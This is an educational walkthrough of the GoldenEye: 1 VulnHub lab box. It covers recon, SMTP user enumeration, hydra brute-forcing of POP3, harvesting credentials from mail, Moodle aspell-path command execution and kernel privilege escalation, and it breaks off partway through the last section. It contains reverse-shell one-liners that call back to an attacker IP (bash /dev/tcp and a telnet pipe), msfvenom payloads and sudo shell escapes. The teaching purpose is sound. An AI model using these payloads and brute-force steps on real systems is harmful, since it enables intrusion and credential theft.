# GoldenEye: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | GoldenEye: 1 |
| **Difficulty** | Intermediate |
| **Author** | Creosote |
| **Released** | 2018-05-04 |
| **VulnHub Entry** | <https://vulnhub.com/entry/goldeneye-1,240/> |
| **Download** | <https://vulnhub.com/entry/goldeneye-1,240/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu 14.04 LTS) |

> An OSCP-style, James Bond-themed box. The whole game is **credential hunting
> through email and web applications**. There are no buffer overflows here —
> instead you chain together several small leaks until one of them hands you a
> shell, then you use a kernel bug to finish as `root`. Values such as passwords
> and banners can differ slightly between rebuilds of the OVA, so treat the
> outputs below as *representative*.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to discover a host on an isolated lab network (ARP scan / `netdiscover`).
- How to read an `nmap` full-port scan and spot **non-standard ports**.
- How to decode a hidden credential from **HTML entities** in a JavaScript file.
- How **SMTP user enumeration** (`VRFY` / `RCPT TO`) reveals valid usernames.
- How to brute-force a **POP3 mail server** with `hydra` when admins pick weak passwords.
- How to read email over **raw POP3** (`nc` / `telnet`) and harvest credentials from it.
- How a legacy web app (**Moodle 2.2.3**) turns into remote code execution through a
  misconfigured spell-checker path.
- How to find and run a **local kernel privilege-escalation exploit** (overlayfs, CVE-2015-1328).

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Identify your own IP + subnet first (the "eth0" adapter is the lab NIC)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
       valid_lft forever preferred_lft forever
```

> **How to read it:** Kali's lab interface usually holds a `192.168.56.x`
> (VirtualBox host-only) or `192.168.19x.x` (VMware) address. The target will
> live on the **same** subnet. Here our attacker is `192.168.56.10`.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# ARP-scan the subnet to list live hosts (fast, uses ARP not TCP)
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:aa:bb:cc, IPv4: 192.168.56.10
Starting arp-scan 1.9.7 with 256 hosts
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:1b:2c:3d       (Unknown)
192.168.56.101  08:00:27:4d:5e:6f       (Unknown)   <-- our target
```

> **Why it works:** `arp-scan` sends an ARP request ("who has this IP?") to every
> address in the subnet. Any machine that answers is alive. It is far faster than
> a TCP scan when you only need to *find* hosts.

**Target IP:** `192.168.56.101`

![arp-scan finding the target at 192.168.56.101](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

> **Goal:** fingerprint every open port and service on the target.


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
# Fast full-TCP port sweep, then service/version detection on open ports
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 25,80,55006,55007 -oA scans/services 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
55006/tcp open  ssl/pop3 Dovecot pop3d
55007/tcp open  pop3     Dovecot pop3d
```

> **How to read it:**
> - `-p-` scans all 65,535 TCP ports.
> - `-sV` guesses the **service and version** behind each open port.
> - `-sC` runs Nmap's default scripts (banners, safe checks).
> - Two things jump out: an **SMTP server** (port 25, great for username
>   enumeration) and a **POP3 mail server on a very high, non-standard port**
>   (55007) — a classic sign that someone changed the port to "hide" it.

![nmap showing ports 25, 80, 55006 and 55007](images/02-nmap.png)

Now look at the website on port 80.

```bash
curl -sI http://192.168.56.101/
curl -s http://192.168.56.101/ | head
```

```text
HTTP/1.1 302 Found
Location: http://severnaya-station.com/sev-home/
```

> **Why it works:** the server redirects us to the hostname
> `severnaya-station.com`. Virtual hosts on this box only respond correctly when
> the `Host:` header (or the URL) contains that name, so we add it to our hosts
> file:

```bash
echo "192.168.56.101 severnaya-station.com" | sudo tee -a /etc/hosts
```

Browsing `http://severnaya-station.com/sev-home/` pops an **HTTP Basic Auth**
login box. Before trying to log in, view the page source.

```bash
curl -s http://severnaya-station.com/sev-home/ | grep -i "terminal"
```

```text
<script src="terminal.js"></script>
```

```bash
curl -s http://severnaya-station.com/sev-home/js/terminal.js
```

```text
// Under Construction
// &amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;...
// (HTML-encoded string; the user comment above says it is the password)
```

> **Why it works:** the credentials are hidden as **HTML numeric character
> references** (`&#73;` = `I`, `&#110;` = `n`, …). Any HTML/entity decoder turns
> them back into plain text. Decoding the whole string yields:

```text
boris:InvincibleHack3r
```

Log in to `http://severnaya-station.com/sev-home/` with `boris` /
`InvincibleHack3r`. The page (and its "GNO" notices) tells you two crucial
things:

1. Users are *Boris*, *Natalya*, *Xenia*, … and they have **email accounts**.
2. The POP3 mail server runs on the **non-default** high port we found (55007).

![split screen: terminal.js decoded into boris:InvincibleHack3r](images/03-enum.png)

---

## 3. Foothold

> **Goal:** turn leaked credentials into the first shell.

### 3.1 Enumerate mail users over SMTP (port 25)

The simplest way to confirm which usernames exist is the POP3/SMTP `VRFY`
verb, or `smtp-user-enum`:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)
> ### 📖 Concept — SMTP user enumeration
>
> **SMTP** (port 25) is mail transport, and two of its commands were designed to
> *validate* addresses — which means they disclose whether a user exists:
>
> ```bash
> nc target 25
> VRFY michael        # 250 = exists · 550 = does not
> EXPN admin          # expand a mailing list to its members
> ```
>
> Modern servers usually disable both. If so, the same information leaks from **login
> error messages** ("no such user" vs "wrong password") and from **RCPT TO** during a
> mail transaction. Automate it:
>
> ```bash
> smtp-user-enum -M VRFY -U /usr/share/wordlists/usernames.txt -t target
> hydra -L users.txt -P pass.txt smtp://target
> ```
>
> **Why this matters:** usernames are half of every credential pair. Enumerating them
> turns a two-unknown brute force into a one-unknown one — and lets you password-spray
> a single guess across many accounts while staying under lockout thresholds.
>
> Also worth trying: SMTP is sometimes configured to **relay** or to accept mail for
> local users, and `sendmail`/`exim` versions have well-known local root exploits.
> Check the banner version (`nc target 25` prints it immediately) against
> `searchsploit`.
>
> **Deep dive:** [CONCEPTS §9.6 — SMTP](../../docs/CONCEPTS.md#96-smtp--port-25)

```bash
# Manual check
printf 'VRFY boris\r\nVRFY natalya\r\nVRFY xenia\r\nVRFY doak\r\nQUIT\r\n' \
  | nc 192.168.56.101 25
```

```text
250 boris
250 natalya
252
250 doak
221 Bye
```

> **Why it works:** `VRFY` asks the SMTP server "does this mailbox exist?".
> Different reply codes (`250` = yes, `252` = cannot verify) leak which
> usernames are real. That gives us a short list to brute-force.

### 3.2 Brute-force the POP3 passwords

Admins on this box reused weak, dictionary passwords. `fasttrack.txt` ships with
Kali and is small enough to finish in minutes:


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)
> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
cat > users.txt <<'EOF'
boris
natalya
EOF

hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt \
      -s 55007 -f 192.168.56.101 pop3
```

```text
[55007][pop3] host: 192.168.56.101   login: boris    password: secret1!
[55007][pop3] host: 192.168.56.101   login: natalya  password: bird
2 of 2 targets completed, 2 valid passwords found
```

> **Why it works:** `hydra` tries every username/password pair in the lists and
> watches for `+OK Logged in`. Because POP3 has no lockout here and the passwords
> are common words, the attack succeeds. Try a **small** wordlist first — big
> lists are noisy and slow.

### 3.3 Read the mail and harvest more credentials

```bash
nc 192.168.56.101 55007
```

```text
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS secret1!
+OK Logged in.
LIST
+OK 3 messages:
1 544
2 373
3 921
RETR 3
+OK 921 octets
From: alec@janus.boss
Subject: access codes
Boris, your cooperation with our syndicate will pay off big...
. 
```

> **Why it works:** POP3 is a plain-text protocol — you authenticate and then
> `LIST`/`RETR` messages by hand. No email client required. Reading *Natalya's*
> mailbox reveals her new student's credentials:

```text
USER natalya
PASS bird
RETR 2
...

Ok Natalyn I have a new student for you...
username: xenia
password: RCP90rulez!
```

Boris's mailbox hints at another contractor, **doak**. Confirm and crack him too:

```bash
printf 'VRFY doak\r\nQUIT\r\n' | nc 192.168.56.101 25
hydra -l doak -P /usr/share/wordlists/fasttrack.txt \
      -s 55007 -f 192.168.56.101 pop3
```

```text
[55007][pop3] host: 192.168.56.101   login: doak   password: goat
```

Reading **doak's** single email gives us the training-site login:

```text
From: doak@ubuntu
Go to our training site and login to my account...
username: dr_doak
password: 4England!
```

### 3.4 Get into the Moodle training site

The office page told us the internal app lives at
`severnaya-station.com/gnocertdir`. It is a **Moodle** (e-learning) site.

```bash
# hostname was already added in section 2
firefox http://severnaya-station.com/gnocertdir &
```

Log in as `xenia` / `RCP90rulez!`, click around, then log in as
`dr_doak` / `4England!`. While logged in as **dr_doak** you find the site
administrator's credentials (in a private Moodle message / profile — *the exact
location varies by build*):

```text
admin : xWinter1995x!
```

![Moodle admin login and the Site administration menu](images/04-foothold.png)

### 3.5 Abuse Moodle for remote code execution (www-data shell)

Moodle 2.2.3 lets an **admin** point its spell-checker at an arbitrary command.
That is command execution as the web user.

1. Set up a listener on Kali:


> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
# GoldenEye's double-reverse payload uses telnet, so use Metasploit's handler
msfconsole -q
```

```text
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload cmd/unix/reverse
msf6 exploit(multi/handler) > set LHOST 192.168.56.10
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

2. As Moodle admin navigate to **Site administration → Server → System paths**
   and set **Path to aspell** to a reverse-shell one-liner:

```text
sh -c '(sleep 10|telnet 192.168.56.10 4444|while : ; do sh && break; done 2>&1|telnet 192.168.56.10 4444 >/dev/null 2>&1 &)'
```

3. Go to **Site administration → Plugins → Text editors → TinyMCE HTML editor**
   and change the **spell engine** to `PSpellShell`.

4. Create/blog a page that uses the TinyMCE editor and click the
   **spell-checker** button. The handler catches a shell:

```text
[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.101:xxxxx)
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** the "Path to aspell" field is used to *build a shell
> command* when the spell-checker runs (`... $aspell_path ...`). Supplying a
> reverse-shell command instead of the real `aspell` binary means Moodle
> executes **our** command as `www-data`. TinyMCE's spell-check must be set to
> `PSpellShell` so that this code path is actually reached.

Upgrade the shell to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg   ; and:  export TERM=xterm
```

> **Note:** some writeups reach the same `www-data` shell with the Metasploit
> module `exploit/multi/http/moodle_cmd_exec` using `admin` /
> `xWinter1995x!` — same bug, packaged for you.

![reverse shell as www-data](images/05-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

> **Goal:** go from `www-data` to `root`.

First, standard local enumeration:


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)
> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
id; uname -a; cat /etc/os-release
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP ... x86_64 GNU/Linux
VERSION="14.04.3 LTS, Trusty Tahr"
```

> **How to read it:** the kernel is **Ubuntu 3.13.0-32**, which is in the range
> affected by the **overlayfs** local privilege-escalation bug (**CVE-2015-1328**).
> The website's "chatter about compilers" is the author's hint that you'll need
> to compile a local exploit.


> ### 📖 Concept — Kernel exploits: how to match one, and why to use them last
>
> ```bash
> uname -a; cat /proc/version; cat /etc/os-release
